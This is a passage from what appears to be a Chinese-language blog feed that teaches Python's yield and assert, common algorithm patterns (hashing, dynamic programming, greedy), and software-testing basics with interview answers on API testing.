<td>返回一个值，函数结束</td>
</tr>
<tr>
<td>状态保持</td>
<td>函数状态会被保存</td>
<td>函数状态不会被保存</td>
</tr>
<tr>
<td>适用场景</td>
<td>生成器函数</td>
<td>普通函数</td>
</tr>
<tr>
<td>内存占用</td>
<td>惰性求值，节省内存</td>
<td>一次性返回所有结果，占用内存</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="总结"><strong>总结</strong></h3>
<ul>
<li><code>yield</code> 是 Python 中实现生成器的关键，适合处理大量数据或需要惰性求值的场景。</li>
<li>生成器函数通过 <code>yield</code> 逐步返回值，并保持函数状态，直到生成所有值。</li>
<li><code>yield from</code> 可以简化生成器的嵌套调用。</li>
</ul>
<h2 id="assert">assert</h2>
<p><code>assert</code> 是 Python 中的一个关键字，用于调试和测试代码。它的作用是检查某个条件是否为真，如果条件为假，则会触发 <code>AssertionError</code> 异常。<code>assert</code> 通常用于确保程序在某个关键点的状态符合预期，如果不符合，则立即停止程序并抛出错误。</p>
<hr>
<h3 id="assert-的基本语法"><strong>assert 的基本语法</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> condition, message</span><br></pre></td></tr></table></figure>
<ul>
<li><strong><code>condition</code></strong>：需要检查的条件表达式。如果为 <code>True</code>，程序继续执行；如果为 <code>False</code>，则抛出 <code>AssertionError</code>。</li>
<li><strong><code>message</code></strong>（可选）：当条件为 <code>False</code> 时，抛出的异常信息。如果未提供，则使用默认的 <code>AssertionError</code>。</li>
</ul>
<hr>
<h3 id="assert-的作用"><strong>assert 的作用</strong></h3>
<ol>
<li>
<p><strong>调试工具</strong>：</p>
<ul>
<li>用于在开发阶段检查代码逻辑是否正确。</li>
<li>如果条件不满足，程序会立即停止，方便定位问题。</li>
</ul>
</li>
<li>
<p><strong>测试工具</strong>：</p>
<ul>
<li>在单元测试中，用于验证函数的输出是否符合预期。</li>
</ul>
</li>
<li>
<p><strong>文档工具</strong>：</p>
<ul>
<li>通过 <code>assert</code> 可以清晰地表达代码的预期行为。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="assert-的示例"><strong>assert 的示例</strong></h3>
<h4 id="示例-1：简单的-assert-用法">示例 1：简单的 assert 用法</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="keyword">assert</span> x == <span class="number">10</span>, <span class="string">&quot;x 应该等于 10&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果 <code>x == 10</code> 为 <code>True</code>，程序继续执行。</li>
<li>如果 <code>x == 10</code> 为 <code>False</code>，则抛出 <code>AssertionError</code>，并显示消息 <code>&quot;x 应该等于 10&quot;</code>。</li>
</ul>
<hr>
<h4 id="示例-2：检查函数返回值">示例 2：检查函数返回值</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">divide</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">assert</span> b != <span class="number">0</span>, <span class="string">&quot;除数不能为 0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> a / b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">2</span>))  <span class="comment"># 输出: 5.0</span></span><br><span class="line"><span class="built_in">print</span>(divide(<span class="number">10</span>, <span class="number">0</span>))  <span class="comment"># 触发 AssertionError: 除数不能为 0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在函数中使用 <code>assert</code> 可以确保输入参数的有效性。</li>
</ul>
<hr>
<h4 id="示例-3：检查列表是否非空">示例 3：检查列表是否非空</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_list</span>(<span class="params">items</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(items) &gt; <span class="number">0</span>, <span class="string">&quot;列表不能为空&quot;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">process_list([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])  <span class="comment"># 正常执行</span></span><br><span class="line">process_list([])         <span class="comment"># 触发 AssertionError: 列表不能为空</span></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="assert-的注意事项"><strong>assert 的注意事项</strong></h3>
<ol>
<li>
<p><strong>不要用于数据验证</strong>：</p>
<ul>
<li><code>assert</code> 主要用于调试和测试，不应该用于检查用户输入或外部数据。</li>
<li>因为 Python 可以通过 <code>-O</code>（优化模式）运行，此时所有的 <code>assert</code> 语句会被忽略。</li>
</ul>
</li>
<li>
<p><strong>避免副作用</strong>：</p>
<ul>
<li><code>assert</code> 的条件表达式不应该包含有副作用的操作（如修改全局变量、调用函数等），因为在优化模式下这些操作会被跳过。</li>
</ul>
</li>
<li>
<p><strong>替代方案</strong>：</p>
<ul>
<li>对于数据验证或输入检查，应该使用 <code>if</code> 语句并手动抛出异常（如 <code>ValueError</code>、<code>TypeError</code> 等）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="assert-与-if-的区别"><strong>assert 与 if 的区别</strong></h3>
<table>
<thead>
<tr>
<th>特性</th>
<th><code>assert</code></th>
<th><code>if</code></th>
</tr>
</thead>
<tbody>
<tr>
<td>用途</td>
<td>调试和测试</td>
<td>通用条件判断</td>
</tr>
<tr>
<td>触发异常</td>
<td>触发 <code>AssertionError</code></td>
<td>需要手动抛出异常</td>
</tr>
<tr>
<td>优化模式</td>
<td>在 <code>-O</code> 模式下会被忽略</td>
<td>不受影响</td>
</tr>
<tr>
<td>适用场景</td>
<td>检查内部逻辑是否正确</td>
<td>检查用户输入或外部数据</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="assert-的优化模式"><strong>assert 的优化模式</strong></h3>
<p>Python 支持以优化模式运行脚本，此时所有的 <code>assert</code> 语句会被忽略。可以通过以下命令启用优化模式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -O script.py</span><br></pre></td></tr></table></figure>
<ul>
<li>在优化模式下，<code>assert</code> 语句不会被执行，因此不能依赖它来实现关键逻辑。</li>
</ul>
<hr>
<h3 id="总结-2"><strong>总结</strong></h3>
<ul>
<li><code>assert</code> 是一个强大的调试工具，用于检查代码逻辑是否符合预期。</li>
<li>它适合在开发和测试阶段使用，但不适合用于生产环境中的数据验证。</li>
<li>如果需要更健壮的输入检查，应该使用 <code>if</code> 语句并手动抛出异常。</li>
</ul>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>算法</title>
    <url>/2025/03/10/%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1>哈希</h1>
<h2 id="题目特征">题目特征</h2>
<ol>
<li><strong>快速查找需求</strong>
<ul>
<li>如判断元素是否存在（重复、交集等），或需要快速查询互补值（如两数之和）。</li>
</ul>
</li>
<li><strong>统计频率/次数</strong>
<ul>
<li>统计字符、数字等的出现次数，例如变位词、多数元素问题。</li>
</ul>
</li>
<li><strong>唯一性/去重问题</strong>
<ul>
<li>如找第一个不重复字符、去重后保留特定顺序等。</li>
</ul>
</li>
<li><strong>映射关系维护</strong>
<ul>
<li>需建立元素间映射（如字符串同构），或记录元素的位置信息（如子数组问题）。</li>
</ul>
</li>
<li><strong>前缀和优化</strong>
<ul>
<li>结合哈希表快速计算子数组和、差值等（如和为K的子数组）</li>
</ul>
</li>
</ol>
<h2 id="常见解题思路">常见解题思路</h2>
<ol>
<li><strong>哈希集合（HashSet）</strong>
<ul>
<li>存储唯一元素，用于去重或存在性判断。<br>
<strong>示例题</strong>：环形链表、快乐数、数组交集。</li>
</ul>
</li>
<li><strong>哈希映射（HashMap）</strong>
<ul>
<li>记录键值对，存储元素及其索引、频率或其他关联信息。<br>
<strong>示例题</strong>：两数之和、变位词分组、克隆图的深拷贝。</li>
</ul>
</li>
<li><strong>前缀和 + 哈希表</strong>
<ul>
<li>计算前缀和，用哈希表记录和的出现次数或最早出现位置。<br>
<strong>示例题</strong>：和为K的子数组、连续数组（0和1数量相等的最长子数组）。</li>
</ul>
</li>
<li><strong>滑动窗口 + 哈希表</strong>
<ul>
<li>维护窗口内元素的哈希统计，用于子串/子数组问题。<br>
<strong>示例题</strong>：无重复字符的最长子串、最小覆盖子串。</li>
</ul>
</li>
<li><strong>频率统计与比较</strong>
<ul>
<li>用哈希表统计频率后比较（如变位词），或用数组替代哈希优化空间（如仅小写字母的场景）。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="优化技巧"><strong>优化技巧</strong></h2>
<ul>
<li><strong>数组替代哈希表</strong>：若元素范围有限（如字母、固定范围的数字），使用数组更高效。</li>
<li><strong>双向映射</strong>：处理同构问题时，需双向检查两个哈希表的映射关系。</li>
<li><strong>延迟更新</strong>：在滑动窗口中，可延迟删除哈希表中的元素以简化逻辑（如某些子串问题）。</li>
</ul>
<hr>
<h2 id="典型例题"><strong>典型例题</strong></h2>
<ol>
<li><strong>两数之和</strong>（HashMap记录值与索引）</li>
<li><strong>无重复字符的最长子串</strong>（滑动窗口 + HashMap记录字符最新位置）</li>
<li><strong>字母异位词分组</strong>（HashMap以排序后的字符串为Key）</li>
<li><strong>和为K的子数组</strong>（前缀和 + HashMap统计和出现次数）</li>
<li><strong>最长连续序列</strong>（HashSet快速查找连续元素）</li>
</ol>
<h1>动态规划（DP）</h1>
<h2 id="题目特征-2"><strong>题目特征</strong></h2>
<ol>
<li><strong>最优化问题</strong>
<ul>
<li>如求最大值、最小值、最长/最短路径等。</li>
</ul>
</li>
<li><strong>重叠子问题</strong>
<ul>
<li>问题可以分解为多个子问题，且子问题之间存在重叠（重复计算）。</li>
</ul>
</li>
<li><strong>无后效性</strong>
<ul>
<li>当前状态只与之前的状态有关，而与之后的状态无关。</li>
</ul>
</li>
<li><strong>状态转移</strong>
<ul>
<li>问题可以通过状态转移方程描述，即当前状态由之前的状态推导而来。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="常见解题思路-2"><strong>常见解题思路</strong></h2>
<ol>
<li><strong>定义状态</strong>
<ul>
<li>明确问题的状态表示，通常用 <code>dp[i]</code> 或 <code>dp[i][j]</code> 表示某种条件下的最优解。<br>
<strong>示例</strong>：</li>
<li><code>dp[i]</code>：以第 <code>i</code> 个元素结尾的子问题的解（如最长递增子序列）。</li>
<li><code>dp[i][j]</code>：从位置 <code>(0,0)</code> 到 <code>(i,j)</code> 的解（如网格路径问题）。</li>
</ul>
</li>
<li><strong>状态转移方程</strong>
<ul>
<li>根据问题的逻辑，推导出状态之间的关系。<br>
<strong>示例</strong>：</li>
<li>斐波那契数列：<code>dp[i] = dp[i-1] + dp[i-2]</code></li>
<li>最长递增子序列：<code>dp[i] = max(dp[i], dp[j] + 1)</code>，其中 <code>j &lt; i</code> 且 <code>nums[j] &lt; nums[i]</code></li>
<li>背包问题：<code>dp[i][j] = max(dp[i-1][j], dp[i-1][j-w[i]] + v[i])</code></li>
</ul>
</li>
<li><strong>初始化</strong>
<ul>
<li>确定初始状态的值，通常为边界条件。<br>
<strong>示例</strong>：</li>
<li><code>dp[0] = 0</code> 或 <code>dp[0] = 1</code>（根据问题需求）。</li>
<li>二维 DP 问题中，通常需要初始化第一行和第一列。</li>
</ul>
</li>
<li><strong>计算顺序</strong>
<ul>
<li>按照状态转移方程的逻辑，确定计算顺序（如从左到右、从下到上等）。</li>
</ul>
</li>
<li><strong>返回结果</strong>
<ul>
<li>根据问题需求，返回 <code>dp</code> 数组中的某个值或最大值/最小值。</li>
</ul>
</li>
</ol>
<hr>
<p><strong>常见动态规划问题类型</strong></p>
<ol>
<li><strong>线性 DP</strong>
<ul>
<li>状态定义为一维数组，如斐波那契数列、最长递增子序列、最大子数组和。</li>
</ul>
</li>
<li><strong>二维 DP</strong>
<ul>
<li>状态定义为二维数组，如网格路径问题、编辑距离、最长公共子序列。</li>
</ul>
</li>
<li><strong>背包问题</strong>
<ul>
<li>0-1 背包、完全背包、多重背包等，状态转移涉及容量和物品选择。</li>
</ul>
</li>
<li><strong>区间 DP</strong>
<ul>
<li>状态定义为区间，如石子合并、最长回文子串。</li>
</ul>
</li>
<li><strong>树形 DP</strong>
<ul>
<li>在树结构上进行状态转移，如二叉树中的最大路径和。</li>
</ul>
</li>
<li><strong>状态压缩 DP</strong>
<ul>
<li>通过位运算等技巧压缩状态，减少空间复杂度（如旅行商问题）。</li>
</ul>
</li>
</ol>
<hr>
<p><strong>解题步骤总结</strong></p>
<ol>
<li>分析问题是否满足动态规划的特征（最优化、重叠子问题、无后效性）。</li>
<li>定义状态，明确 <code>dp</code> 数组的含义。</li>
<li>推导状态转移方程，确定如何从子问题推导出当前问题。</li>
<li>初始化 <code>dp</code> 数组，处理边界条件。</li>
<li>按顺序计算 <code>dp</code> 数组，并返回最终结果。</li>
<li>考虑空间优化（如滚动数组）。</li>
</ol>
<h2 id="优化技巧-2"><strong>优化技巧</strong></h2>
<ol>
<li><strong>空间优化</strong>
<ul>
<li>如果状态转移只依赖于前几个状态，可以用滚动数组或变量代替整个 <code>dp</code> 数组。<br>
<strong>示例</strong>：斐波那契数列中，只需两个变量 <code>prev</code> 和 <code>curr</code>。</li>
</ul>
</li>
<li><strong>记忆化搜索</strong>
<ul>
<li>在递归中缓存子问题的解，避免重复计算（如自顶向下的 DP）。</li>
</ul>
</li>
<li><strong>预处理</strong>
<ul>
<li>对输入数据进行预处理（如排序），简化状态转移逻辑。</li>
</ul>
</li>
<li><strong>边界条件处理</strong>
<ul>
<li>注意处理边界条件，避免数组越界或逻辑错误。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="典型例题-2"><strong>典型例题</strong></h2>
<ol>
<li><strong>斐波那契数列</strong>（线性 DP）</li>
<li><strong>最长递增子序列</strong>（线性 DP）</li>
<li><strong>最大子数组和</strong>（线性 DP）</li>
<li><strong>编辑距离</strong>（二维 DP）</li>
<li><strong>0-1 背包问题</strong>（背包 DP）</li>
<li><strong>最长回文子串</strong>（区间 DP）</li>
<li><strong>打家劫舍</strong>（线性 DP + 空间优化）</li>
<li><strong>三角形最小路径和</strong>（二维 DP + 空间优化）</li>
</ol>
<h1>贪心算法</h1>
<h2 id="题目特征-3"><strong>题目特征</strong></h2>
<p><strong>1. 明显的局部最优可推导全局最优</strong></p>
<ul>
<li>问题可以通过每一步选择当前最优解，最终得到全局最优解。</li>
<li><strong>典型场景</strong>：最少操作次数、最大收益、最短时间等最优化问题。</li>
</ul>
<p><strong>2. 无后效性</strong></p>
<ul>
<li>当前选择不会影响后续子问题的结构，后续状态仅依赖当前状态。</li>
</ul>
<p><strong>3. 常见问题类型</strong></p>
<ul>
<li><strong>区间调度</strong>：如最多不重叠活动、合并区间。</li>
<li><strong>分配问题</strong>：分糖果、任务调度。</li>
<li><strong>跳跃覆盖</strong>：能否到达终点、最少跳跃次数。</li>
<li><strong>数学规律</strong>：找零钱（特定面值）、加油站问题。</li>
<li><strong>压缩编码</strong>：哈夫曼编码、字符串重构。</li>
</ul>
<hr>
<h2 id="常见解题思路-3"><strong>常见解题思路</strong></h2>
<p><strong>1. 排序 + 贪心遍历</strong></p>
<ul>
<li><strong>核心</strong>：通过排序预处理，使数据满足贪心选择的顺序。</li>
<li><strong>典型例题</strong>：
<ul>
<li><strong>合并区间</strong>：按左端点排序，合并右端点连续的区间。</li>
<li><strong>最多不重叠活动</strong>：按结束时间排序，选择最早结束的活动。</li>
</ul>
</li>
</ul>
<p><strong>2. 优先队列（堆）维护当前最优</strong></p>
<ul>
<li><strong>核心</strong>：动态选择当前最优解（如最大值、最小值）。</li>
<li><strong>典型例题</strong>：
<ul>
<li><strong>合并K个有序链表</strong>：用小根堆每次取最小节点。</li>
<li><strong>任务调度器</strong>：优先处理剩余次数最多的任务，避免冷却时间。</li>
</ul>
</li>
</ul>
<p><strong>3. 数学性质推导</strong></p>
<ul>
<li><strong>核心</strong>：利用问题中隐藏的数学规律直接决策。</li>
<li><strong>典型例题</strong>：
<ul>
<li><strong>跳跃游戏</strong>：维护当前能到达的最远距离，不回溯。</li>
<li><strong>加油站问题</strong>：总油量≥0时，必存在解；遍历找到剩余油量最低点的下一个站点。</li>
</ul>
</li>
</ul>
<p><strong>4. 双向贪心或多次遍历</strong></p>
<ul>
<li><strong>核心</strong>：通过左右两次遍历或前后双指针满足不同条件。</li>
<li><strong>典型例题</strong>：
<ul>
<li><strong>分发糖果</strong>：左遍历保证右分高者多，右遍历保证左分高者多。</li>
<li><strong>接雨水</strong>：双指针从两端向中间逼近，计算局部凹陷。</li>
</ul>
</li>
</ul>
<h2 id="优化技巧-3"><strong>优化技巧</strong></h2>
<p><strong>1. 排序优化</strong></p>
<ul>
<li>若问题只需局部有序，可用<strong>计数排序</strong>或<strong>桶排序</strong>降低时间复杂度。
<ul>
<li><strong>示例</strong>：任务调度器中按任务频率排序。</li>
</ul>
</li>
</ul>
<p><strong>2. 空间压缩</strong></p>
<ul>
<li>用变量替代数组，减少空间复杂度。
<ul>
<li><strong>示例</strong>：跳跃游戏中用 <code>max_reach</code> 替代DP数组。</li>
</ul>
</li>
</ul>
<p><strong>3. 剪枝策略</strong></p>
<ul>
<li>提前终止无效遍历。
<ul>
<li><strong>示例</strong>：加油站问题中，若当前油量不足则直接跳到下一个起点。</li>
</ul>
</li>
</ul>
<p><strong>4. 数学替换</strong></p>
<ul>
<li>将问题转化为数学公式，避免复杂逻辑。
<ul>
<li><strong>示例</strong>：柠檬水找零问题中，优先用10元找零，减少5元消耗。</li>
</ul>
</li>
</ul>
<h2 id="易错点与注意事项"><strong>易错点与注意事项</strong></h2>
<ol>
<li><strong>贪心策略的证明</strong>：必须验证局部最优能推导全局最优（可通过反证法或数学归纳）。</li>
<li><strong>边界条件</strong>：如空输入、全零、单元素等情况需特殊处理。</li>
<li><strong>排序规则</strong>：区间问题按左端点还是右端点排序，影响贪心逻辑。</li>
</ol>
]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>软件测试</title>
    <url>/2025/03/10/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1>基础</h1>
<ul>
<li>问题报告单样式</li>
</ul>
<p><img src="/test/%E9%97%AE%E9%A2%98%E6%8A%A5%E5%91%8A%E5%8D%95.png" alt="问题报告单"></p>
<ul>
<li>测试计划文档组成</li>
</ul>
<p><img src="/test/%E8%AE%A1%E5%88%92%E6%96%87%E6%A1%A3%E7%BB%84%E6%88%90.png" alt=""></p>
<ul>
<li>测试工作流程</li>
</ul>
<p>掌握需求 -&gt;测试计划-&gt;测试用例-&gt;测试执行-&gt;测试报告-&gt;回归测试</p>
<p>测试开始时，须有：1.系统需求说明书文档  2.BUG管理工具的地址和账户</p>
<p><strong>单元测试</strong>：在开发阶段进行，验证单个代码单元的正确性。</p>
<p><strong>集成测试</strong>：在单元测试之后进行，验证多个模块的协同工作。</p>
<p><strong>系统测试</strong>：在集成测试之后进行，验证整个系统的功能和性能。</p>
<p><strong>验收测试</strong>：在系统测试之后进行，由客户或最终用户确认系统是否满足需求</p>
<ul>
<li>名词解释</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑盒测试：不关心代码，只测输入输出。</span><br><span class="line"></span><br><span class="line">白盒测试：基于代码结构设计测试。</span><br><span class="line"></span><br><span class="line">结构测试：通过代码结构设计测试用例。</span><br><span class="line"></span><br><span class="line">功能测试：验证功能是否符合需求。</span><br><span class="line"></span><br><span class="line">路径测试：覆盖代码中的所有路径。</span><br><span class="line"></span><br><span class="line">增量测试：逐步集成和测试新模块。</span><br><span class="line"></span><br><span class="line">崩溃测试：测试系统在极端条件下的稳定性。</span><br><span class="line"></span><br><span class="line">性能测试：评估系统在不同负载下的性能。</span><br><span class="line"></span><br><span class="line">回归测试：确保修改后原有功能不受影响。</span><br><span class="line"></span><br><span class="line">单元测试：测试最小可测试单元。</span><br><span class="line"></span><br><span class="line">集成测试：测试多个模块的组合。</span><br><span class="line"></span><br><span class="line">系统测试：测试整个系统。</span><br><span class="line"></span><br><span class="line">验收测试：由客户确认系统是否满足需求。</span><br><span class="line"></span><br><span class="line">负载测试：模拟高负载测试性能。</span><br><span class="line"></span><br><span class="line">压力测试：测试系统的极限能力。</span><br><span class="line"></span><br><span class="line">安全测试：评估系统安全性。</span><br><span class="line"></span><br><span class="line">兼容性测试：测试系统在不同环境下的兼容性。</span><br><span class="line"></span><br><span class="line">冒烟测试：快速测试主要功能。</span><br><span class="line"></span><br><span class="line">探索性测试：无预设用例，通过探索发现问题。</span><br><span class="line"></span><br><span class="line">α测试：由内部人员在开发环境中进行</span><br><span class="line"></span><br><span class="line">β测试：是软件发布前的最终测试阶段，通常在α测试之后进行。它由真实用户在实际环境中执行，目的是发现开发团队未察觉的问题。</span><br><span class="line"></span><br><span class="line">用户验收测试（UAT）：由客户确认软件是否满足需求，β测试更侧重于广泛用户反馈。</span><br><span class="line"></span><br><span class="line">迭代测试：是敏捷开发中的一种测试方法，随着每个开发迭代的进行，测试活动也同步展开。每次迭代都会进行完整的测试循环，包括单元测试、集成测试、系统测试等，以确保新增功能和现有功能都符合需求。特点：持续进行：测试贯穿整个开发周期，而非仅在开发完成后进行。增量式：每次迭代只测试新增或修改的部分，同时进行回归测试以确保原有功能不受影响。快速反馈：通过频繁测试，开发团队能快速发现并修复问题。能都经过充分测试。</span><br></pre></td></tr></table></figure>
<h1>面试</h1>
<h2 id="测试流程与规范">测试流程与规范</h2>
<p><strong>偶现bug怎么处理？</strong></p>
<p>截图、保留证据，根据操作路径进⾏重现，提交禅道，上线前继续跟踪，上线后再跟踪⼀两个版本，最后作为遗留bug写到测试报告⾥⾯</p>
<p><strong>没有需求⽂档，如何开展测试？</strong></p>
<p>1、与相关⼈员沟通，产品或开发<br>
2、参考同⾏业竞品，总结梳理需求<br>
3、根据⽤户习惯和⾏业规范，总结梳理</p>
<p><strong>线上出现bug怎么办？</strong></p>
<p>⾸先评估严重程度和产⽣原因，<br>
1、如果是影响⾯⽐较⼤的功能性问题，且短时间内不好定位具体原因，⾸先考虑做代码回滚，恢复到上<br>
⼀个稳定版本，然后在测试环境进⾏重现，定位问题原因<br>
2、如果是能快速定位问题原因，就让开发做紧急修复，测试后进⾏上线<br>
3、如果是性能问题，⼀般会进⾏扩容，或重启尝试解决，然后开发会做进⼀步的问题定位和优化<br>
4、如果是⼀些优化性问题，会先进⾏记录，然后在下个版本解决<br>
最后，线上bug解决后，要对问题进⾏复盘，分析和总结，避免后续再出现类似问题</p>
<p><strong>临近上线发现了bug要怎么处理？</strong></p>
<p>⾸先与相关⼈员（开发、产品）评估bug的严重程度和影响范围，<br>
如果是轻微的bug，可以考虑先上线，后续版本迭代中修复，<br>
如果是⽐较严重的bug，找开发沟通，能否快速修复，并且有⾜够的时间去做下测试<br>
如果时间不⾜了，那就得和相关⼈员后台，是否可以延期上线，避免上线后造成严重的后果<br>
参加⼈员：测试⼈员、开发⼈员、产品⼈员 会议评审</p>
<p><strong>⽤例评审都有哪些⼈参加？怎么做的？有什么标准？</strong></p>
<p>参加⼈员：测试⼈员、开发⼈员、产品⼈员 会议评审<br>
标准：</p>
<ol>
<li>
<p>⽤例设计的结构安排是否清晰、合理，是否利于⾼效对需求进⾏覆盖。</p>
</li>
<li>
<p>优先极安排是否合理。</p>
</li>
<li>
<p>是否覆盖测试需求上的所有功能点。</p>
</li>
<li>
<p>⽤例是否具有很好可执⾏性。例如⽤例的前提条件、执⾏步骤、输⼊数据和期待结果是否清晰、正确；</p>
</li>
<li>
<p>期待结果是否有明显的验证⽅法。<br>
是否已经删除了冗余的⽤例</p>
</li>
</ol>
<p><strong>迭代测试发现不了问题，怎么办？</strong></p>
<p>1)必要的业务培训<br>
结合业务流程图、系统架构图，对业务系统有个整体的感知。知道业务系统的整体业务流向及涉及的系统架构，这样有助于测试⼈员从⼤的⽅向去拉通测试场景，不⾄于陷⼊细节中⽽⽆法顾及全貌。<br>
2)制定明确地测试策略<br>
即明确两个问题：测什么？怎么测？“减少缺陷的出现”可以通过测试前移等⽅法来解决，在进⾏软件需求分析和架构设计的时候发现<br>
缺陷；<br>
3)严格执⾏测试流程<br>
设计测试⽤例、⽤例评审、开发⾃测等<br>
4)建⽴质量意识和责任感<br>
出现问题时，测试应该有责任和能⼒去探查问题的根源并加以改进<br>
5)定期回顾和总结<br>
缺陷分析，在某个迭代或者版本的周期内（或者更⻓时间），对BUG产⽣的原因、修复周期、累<br>
积趋势进⾏分析。总结分析bug和测试过程问题，形成的质量报告不仅能准确评估过去产品质量，还能为未来产品提出改进建议，持续推进产品质量的不断提⾼和完善</p>
<h2 id="接口测试">接口测试</h2>
<ul>
<li>什么时候会做接⼝测试</li>
</ul>
<p>回归测试<br>
前后端联调阶段（开发进⾏⾃测）<br>
验证⼀些后端接⼝是否有限制的场景（资⾦相关）</p>
<ul>
<li>怎么做接⼝测试的</li>
</ul>
<p>1、获取到接⼝⽂档、熟悉单接⼝的业务、连接接⼝业务，包括接⼝地址，请求⽅式，鉴权，⼊参，出<br>
参，错误码等 加密，签名等<br>
2、编写接⼝⽤例并评审<br>
正例：单接⼝，链接接⼝<br>
反例：鉴权（过期的场景、不正确）<br>
参数（类型异常、⻓度异常），<br>
错误码（-1 系统繁忙、不同公司不⼀样），<br>
⿊名单（⿊名单⽤户是否还允许访问）<br>
禁⽤<br>
调⽤次数（⼿续费）<br>
分⻚（每⻚10条，每⻚是否都有数据，总数据是否正确，边界值）<br>
兼容性（不同调⽤⽅式下（如app版本不⼀样时），接⼝返回的数据是否相同）<br>
3、执⾏⽤例<br>
举出具体的接⼝案例以及⼀些特定场景，如：接⼝串联（token传递）、环境变量、全局变量、随机数获<br>
取（⽐如第三⽅单号）</p>
<p>4、持续集成<br>
钉钉群通知、电⼦邮件</p>
<ul>
<li>如果⼀个接⼝请求不通，那么你会考虑哪些⽅⾯的问题？</li>
</ul>
<p>1、检查请求四要素：请求⽅式、域名、请求头、请求参数、有没有空格<br>
2、⽹络情况<br>
3、项⽬迭代过程中是否有部署好<br>
4、服务器的防⽕墙<br>
5、查看后台⽇志是否有报错<br>
6、访问权限是否到位<br>
7、⼀边打开fiddler（打开代理服务器，证书有问题）⼀遍做接⼝测试（基于https）<br>
8、检查是否绑定了错误的hosts</p>
<ul>
<li>接⼝测试的作⽤</li>
</ul>
<p>1、接⼝测试是⽆⻚⾯的功能测试，设计⽤例思路跟功能测试⼀样（只是⼀个注重的是测前端⻚⾯，⼀个注重的是测后端接⼝）<br>
2、接⼝测试可以绕开前端<br>
3、接⼝测试可以校验并发的情况<br>
4、可以核对接⼝请求资源⼤⼩<br>
5、可以进⾏弱⽹测试</p>
<ul>
<li>接⼝测试的主要关注点？</li>
</ul>
<p>（1）业务逻辑（业务逻辑覆盖）<br>
（2）响应结构<br>
（3）数据格式<br>
（4）数据正确性（依据来源：查数据库与服务器和接⼝返回值⽐较）</p>
<ul>
<li>Cooike、session、token的区别</li>
</ul>
<p>相同点：三者都⽤于鉴权，都是服务器⽣成<br>
不同点：<br>
Cooike：保存在浏览器，不安全<br>
session：保存在服务器的内存，并且它⼀般是通过cooike传输sessionid，它⽐cooike更安全，当访问量⼤的时候影响服务器的性能<br>
token 存储在服务器的数据库，通常是通过登录或者⼀个特定的接⼝传⼊appid和appsect来获取，后续所有的接⼝都必须带上token 才能请求成功，有些项⽬toekn也是通过cookie传输的</p>
<ul>
<li>特定接⼝：对于需要做RSA加密的接⼝，需要做签名的接⼝在Jmeter/postman要如何处理？</li>
</ul>
<p><strong>JMeter</strong></p>
<p>使用 <strong>JSR223 预处理器</strong> 或 <strong>BeanShell 预处理器</strong> 编写脚本实现 RSA 加密和签名。</p>
<p>将结果存储到 JMeter 变量中，并在请求中使用。</p>
<p><strong>Postman</strong></p>
<p>使用 <strong>Pre-request Script</strong> 编写脚本实现 RSA 加密和签名。</p>
<p>将结果存储到 Postman 变量中，并在请求中使用。</p>
<ul>
<li>如何验证接⼝是否返回成功</li>
</ul>
<p>1、校验状态码是否200（状态断⾔ 只有⼀个）<br>
2、核⼼业务断⾔<br>
返回结果⽐较短的：key=value<br>
返回结果较⻓的：通过关键信息，数据库校验⻓度<br>
3、XML或JSON：通过正则，jsonpath提取关键的业务字段进⾏断⾔</p>
<ul>
<li>接⼝关联怎么做</li>
</ul>
<p>⽤⼀个全局变量来处理依赖的数据，⽐如登录后返回 token,其它接⼝都需要这 个 token,那就⽤全局变量来传 token 参数</p>
<ul>
<li>没有接⼝⽂档如何做接⼝测试</li>
</ul>
<p>可以使⽤抓包⼯具进⾏抓包看接⼝请求参数，然后不懂的跟开发沟通</p>
<ul>
<li>常⻅的接⼝请求头</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept</span><br><span class="line">X-Requested-With</span><br><span class="line">User-Agent</span><br><span class="line">Content-Type</span><br></pre></td></tr></table></figure>
<ul>
<li>接⼝测试常⽤检查点</li>
</ul>
<h1>接口测试检查点（按检查类型分类）</h1>
<table>
<thead>
<tr>
<th><strong>检查类型</strong></th>
<th><strong>检查点</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>业务测试</strong></td>
<td>正常流程返回数据的正确性</td>
<td>验证接口在正常业务流程下返回的数据内容、格式、逻辑是否符合预期。</td>
</tr>
<tr>
<td></td>
<td>接口文档符合性</td>
<td>验证返回值是否按接口文档规定格式（如JSON/XML）、编码（UTF-8）、字段命名（如<code>return_msg</code>）返回。</td>
</tr>
<tr>
<td></td>
<td>参数类型传递正确性</td>
<td>验证接口是否正确处理参数类型（如数字、字符串、布尔值等）。</td>
</tr>
<tr>
